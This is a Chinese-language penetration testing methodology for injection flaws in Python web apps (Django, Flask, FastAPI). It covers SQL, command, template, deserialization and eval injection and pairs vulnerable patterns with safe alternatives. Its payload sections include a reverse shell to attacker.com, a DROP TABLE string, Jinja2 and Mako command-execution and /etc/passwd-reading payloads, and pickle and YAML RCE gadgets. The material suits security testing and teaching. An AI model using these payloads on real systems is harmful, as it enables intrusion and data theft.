# Python 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 Python 应用注入漏洞的系统化测试流程，覆盖 SQL 注入、命令注入、模板注入、反序列化等 Python 特有的注入类型。

## 1.2 适用范围
适用于使用 Python 开发的 Web 应用、API 接口，包括 Django、Flask、FastAPI、Tornado 等框架的应用系统。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：Python 应用注入系统化测试

### 2.1 技术介绍

Python 应用注入测试针对 Python 技术栈特有的漏洞类型，包括：
- **SQL 注入**：SQLite3、MySQLdb、SQLAlchemy 中的注入
- **命令注入**：os.system()、subprocess.call() 等
- **模板注入（SSTI）**：Jinja2、Mako、Django Template 注入
- **反序列化漏洞**：pickle、yaml、eval 注入
- **代码注入**：eval()、exec()、__import__()

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **框架** | Django、Flask、FastAPI、Tornado、Bottle |
| **ORM** | SQLAlchemy、Django ORM、Peewee |
| **注入类型** | SQL、命令、SSTI、反序列化、代码注入 |
| **输入点** | 请求参数、HTTP 头、Cookie、文件上传 |

### 2.3 测试流程

#### 2.3.1 技术栈识别

**框架识别方法：**

```
# 响应头特征
Server: WSGIServer/0.2
Server: tornado/6.0
X-Powered-By: Flask

# URL 路径特征
/admin/  # Django Admin
/static/  # 静态文件
/api/docs  # FastAPI Swagger

# 错误页面特征
Django Debug Page
Werkzeug Debugger
Traceback (most recent call last)

# 工具识别
whatweb http://target
wappalyzer (浏览器插件)
```

#### 2.3.2 SQL 注入测试（Python）

**SQLite3 测试：**
```python
# 危险代码模式
cursor.execute("SELECT * FROM users WHERE id = " + user_id)

# 测试 Payload
id=1'
id=1' OR '1'='1
id=1; DROP TABLE users--
```

**SQLAlchemy 测试：**
```python
# 危险代码模式
query = text("SELECT * FROM users WHERE id = " + user_id)
result = db.session.execute(query)

# 安全代码
result = db.session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
```

**Django ORM 测试：**
```python
# 危险代码模式
User.objects.extra(where=["id = " + user_id])
User.objects.raw("SELECT * FROM users WHERE id = " + user_id)

# 安全代码
User.objects.filter(id=user_id)
```

#### 2.3.3 命令注入测试（Python）

**危险函数识别：**
```python
# 危险函数
os.system(command)
os.popen(command)
subprocess.call(command, shell=True)
subprocess.Popen(command, shell=True)
commands.getoutput(command)  # Python 2
```

**测试 Payload：**
```
# 基础命令
param=;id
param=|id
param=`id`
param=$(id)

# 时间延迟
param=;sleep 5
param=;ping -c 5 127.0.0.1

# 反向 Shell
param=;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### 2.3.4 模板注入测试（SSTI）

**Jinja2 测试：**
```
# 基础测试
{{7*7}}
{{7*'7'}}

# 探测
{{config}}
{{self._app_ctx_class}}

# 命令执行
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# 类探测
{{''.__class__.__mro__[2].__subclasses__()}}
```

**Mako 测试：**
```
# 基础测试
${7*7}

# 命令执行
${self.module.cache.util.os.system("id")}
${self.context.request.response.paste.body.write(__import__('os').popen('id').read())}
```

**Django Template 测试：**
```
# 基础测试（Django 模板默认较安全）
{{variable}}

# 如果启用某些设置
{{config.SECRET_KEY}}
```

#### 2.3.5 反序列化测试（Python）

**Pickle 反序列化：**
```python
# 危险代码模式
import pickle
data = pickle.loads(user_input)
```

**测试 Payload：**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
# Base64 编码后发送
```

**YAML 反序列化：**
```python
# 危险代码模式
import yaml
data = yaml.load(user_input)  # 未指定 Loader

# 安全代码
data = yaml.safe_load(user_input)
```

**测试 Payload：**
```yaml
!!python/object/apply:os.system
args: ['id']
```

#### 2.3.6 代码注入测试（Python）

**危险函数识别：**
```python
# 危险函数
eval(code)
exec(code)
__import__(module)
input()  # Python 2
compile(code, ...)
```

**测试 Payload：**
```
# eval 注入
code=__import__('os').system('id')

# exec 注入
code=import os; os.system('id')
```

### 2.4 测试用例清单

#### 2.4.1 Django 测试

```
# Debug 模式泄露
GET /nonexistent

# Admin 枚举
GET /admin/

# SQL 注入（extra/raw）
GET /api/user?id=1' OR '1'='1'--

# 模板注入
GET /search?q={{config}}

# 反序列化
Cookie: session=pickle_payload
```

#### 2.4.2 Flask 测试

```
# Debug 模式/控制台
GET /console

# SSTI（Jinja2）
GET /search?q={{7*7}}
GET /search?q={{config}}
GET /search?q={{''.__class__.__mro__[2].__subclasses__()}}

# 路由遍历
GET /{{url_for('admin')}}

# 命令注入
GET /api/ping?host=127.0.0.1;id
```

#### 2.4.3 FastAPI 测试

```
# API 文档泄露
GET /docs
GET /redoc

# SQL 注入
GET /api/user?id=1' OR '1'='1'--

# 命令注入
GET /api/exec?cmd=id
```

#### 2.4.4 HTTP 头测试

```
# User-Agent
User-Agent: {{7*7}}
User-Agent: ' OR '1'='1--

# Referer
Referer: {{config}}

# X-Forwarded-For
X-Forwarded-For: 127.0.0.1' OR '1'='1--

# Cookie
Cookie: session=pickle_payload
Cookie: user_data={{config}}
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# SQLMap - SQL 注入
sqlmap -u "http://target/api/user?id=1" --dbms=sqlite

# SSTI 检测
tplmap -u "http://target/search?q=test"

# 反序列化 Payload 生成
python -c "import pickle, os; print(pickle.dumps((os.system, ('id',))))"

# 目录扫描
gobuster dir -u http://target -w common.txt -x py
```

#### Burp Suite 插件

- **Python Deserialization** - 检测 pickle 反序列化
- **Hackvertor** - 编码/解码
- **Logger++** - 详细日志记录
- **Turbo Intruder** - 高速请求

### 2.6 测试报告要点

测试完成后，报告应包含：
1. Python 版本和框架信息
2. 所有测试的输入点列表
3. 发现的漏洞点及详情
4. 漏洞利用难度评估
5. 潜在影响范围
6. 修复建议

---

# 第三部分：附录

## 3.1 Python 危险函数速查表

| 类别 | 危险函数 | 安全替代 |
|-----|---------|---------|
| **SQL 查询** | `cursor.execute(sql)` | `cursor.execute(sql, params)` |
| **SQL 查询** | `text(sql)` | `text(sql).bindparams()` |
| **命令执行** | `os.system(cmd)` | `subprocess.run([cmd], shell=False)` |
| **命令执行** | `subprocess.call(cmd, shell=True)` | `subprocess.run([cmd])` |
| **模板** | `render_template_string(user_input)` | 使用模板文件 |
| **反序列化** | `pickle.loads(data)` | `json.loads(data)` |
| **反序列化** | `yaml.load(data)` | `yaml.safe_load(data)` |
| **代码执行** | `eval(code)` | 避免使用 |
| **代码执行** | `exec(code)` | 避免使用 |

## 3.2 SSTI Payload 速查表

| 框架 | Payload | 说明 |
|-----|---------|------|
| **Jinja2** | `{{7*7}}` | 基础测试 |
| **Jinja2** | `{{config}}` | 访问配置 |
| **Jinja2** | `{{''.__class__.__mro__[2].__subclasses__()}}` | 类探测 |
| **Jinja2** | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | 命令执行 |
| **Mako** | `${7*7}` | 基础测试 |
| **Mako** | `${self.module.cache.util.os.system("id")}` | 命令执行 |
| **Django** | `{{variable}}` | 基础测试 |

## 3.3 参考资源

- [OWASP Python Security](https://cheatsheetseries.owasp.org/cheatsheets/Python_Security_Cheat_Sheet.html)
- [Jinja2 Security](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [PortSwigger - Server-side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
